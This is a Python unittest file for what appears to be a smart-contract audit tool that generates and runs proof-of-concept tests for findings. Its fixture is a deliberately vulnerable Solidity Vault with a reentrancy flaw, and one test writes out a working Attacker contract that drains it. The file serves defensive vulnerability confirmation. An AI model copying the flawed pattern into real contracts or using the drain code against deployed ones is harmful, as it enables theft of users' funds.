import importlib.util
import json
from pathlib import Path
import tempfile
import unittest

ROOT = Path(__file__).resolve().parents[1]
SPEC = importlib.util.spec_from_file_location('poc_generator', ROOT / 'scripts' / 'poc_generator.py')
GEN = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(GEN)


class PocGeneratorTests(unittest.TestCase):
    def fixture(self):
        source = '''// SPDX-License-Identifier: MIT
pragma solidity >=0.8.19;
contract Vault {
    mapping(address => uint256) public balances;
    function deposit() external payable { balances[msg.sender] += msg.value; }
    function withdraw() external {
        uint256 amount = balances[msg.sender];
        (bool ok,) = msg.sender.call{value: amount}("");
        require(ok);
        balances[msg.sender] = 0;
    }
}
'''
        return {'id': 'finding-reentrancy-1', 'sourceSha256': GEN.canonical_sha256({'Vault.sol': source}),
                'categoryWeight': 5, 'triggerDifficulty': 0.5, 'reachableAssetsUsd': 1000}, {'sources': {'Vault.sol': {'content': source}}}

    def test_generates_hash_bound_adapter_and_severity_score(self):
        finding, bundle = self.fixture()
        import hashlib
        test_name = f"testPoC_{hashlib.sha256(finding['id'].encode()).hexdigest()[:16]}"
        test_source = f'''// SPDX-License-Identifier: MIT
pragma solidity >=0.8.19;
import "../src/Vault.sol";
contract Attacker {{
    Vault immutable vault;
    constructor(Vault target) {{ vault = target; }}
    function attack() external payable {{ vault.deposit{{value: msg.value}}(); vault.withdraw(); }}
    receive() external payable {{ if (address(vault).balance >= 1 ether) vault.withdraw(); }}
}}
contract PocTest {{
    function {test_name}() public {{
        Vault vault = new Vault();
        vault.deposit{{value: 1 ether}}();
        Attacker attacker = new Attacker(vault);
        attacker.attack{{value: 1 ether}}();
        require(address(vault).balance == 0, "reentrancy drains victim deposit");
    }}
}}
'''
        with tempfile.TemporaryDirectory() as directory:
            output = Path(directory) / 'poc'
            manifest = GEN.generate_poc(finding, bundle, output, test_source=test_source)
            self.assertEqual(manifest['adapterState'], 'ready')
            self.assertEqual(manifest['severityScore'], 2500.0)
            self.assertEqual(json.loads((output / 'poc.json').read_text())['sourceSha256'], finding['sourceSha256'])
            forge = ROOT / 'work' / 'tools' / 'forge'
            if not forge.is_file():
                self.skipTest('bundled forge binary is unavailable')
            import subprocess
            result = subprocess.run([str(forge), 'test', '--root', str(output), '--offline', '--match-test', test_name, '-vv'],
                                    capture_output=True, text=True, timeout=60)
            self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
            self.assertIn(f'[PASS] {test_name}', result.stdout + result.stderr)

    def test_missing_or_wrong_test_adapter_is_not_executable(self):
        finding, bundle = self.fixture()
        with tempfile.TemporaryDirectory() as directory:
            manifest = GEN.generate_poc(finding, bundle, Path(directory) / 'poc', test_source='contract Wrong {}')
            self.assertEqual(manifest['adapterState'], 'adapter_required')
            self.assertIn('POC_ADAPTER_REQUIRED', (Path(directory) / 'poc' / manifest['testPath']).read_text())

    def test_rejects_hash_mismatch_and_invalid_score_factors(self):
        finding, bundle = self.fixture()
        finding['sourceBundleSha256'] = '0' * 64
        with tempfile.TemporaryDirectory() as directory:
            with self.assertRaisesRegex(ValueError, 'does not match'):
                GEN.generate_poc(finding, bundle, Path(directory) / 'poc')
        with self.assertRaises(ValueError):
            GEN.severity_score(1, 1.5, 10)

    def test_local_template_generates_reentrancy_poc_from_evidence(self):
        finding, bundle = self.fixture()
        finding['title'] = 'reentrancy observation'
        bundle['metadata'] = {'settings': {'compilationTarget': {'Vault.sol': 'Vault'}}}
        with tempfile.TemporaryDirectory() as directory:
            manifest = GEN.generate_poc(finding, bundle, Path(directory) / 'poc')
            self.assertEqual(manifest['adapterState'], 'ready')
            self.assertEqual(manifest['generatedFrom'], 'local_template')
            source = (Path(directory) / 'poc' / manifest['testPath']).read_text()
            self.assertIn('function ' + manifest['testName'], source)
            self.assertIn('reentrancy did not drain target', source)

    def test_unknown_finding_remains_adapter_required(self):
        finding, bundle = self.fixture()
        finding['id'] = 'finding-generic-1'
        with tempfile.TemporaryDirectory() as directory:
            manifest = GEN.generate_poc(finding, bundle, Path(directory) / 'poc')
            self.assertEqual(manifest['adapterState'], 'adapter_required')
            self.assertIsNone(manifest['generatedFrom'])

    def test_generated_template_is_confirmed_only_by_real_forge_runner(self):
        finding, bundle = self.fixture()
        finding['title'] = 'reentrancy observation'
        bundle['metadata'] = {'settings': {'compilationTarget': {'Vault.sol': 'Vault'}}}
        with tempfile.TemporaryDirectory() as directory:
            output = Path(directory) / 'poc'
            GEN.generate_poc(finding, bundle, output)
            runner_spec = importlib.util.spec_from_file_location('poc_runner', ROOT / 'scripts' / 'poc_runner.py')
            runner = importlib.util.module_from_spec(runner_spec)
            runner_spec.loader.exec_module(runner)
            result = runner.run_poc(output, forge=ROOT / 'work' / 'tools' / 'forge')
            self.assertEqual(result['pocState'], 'confirmed')
            self.assertTrue(result['confirmedVulnerability'])
            self.assertEqual(result['attempts'][0]['state'], 'confirmed')


if __name__ == '__main__':
    unittest.main()
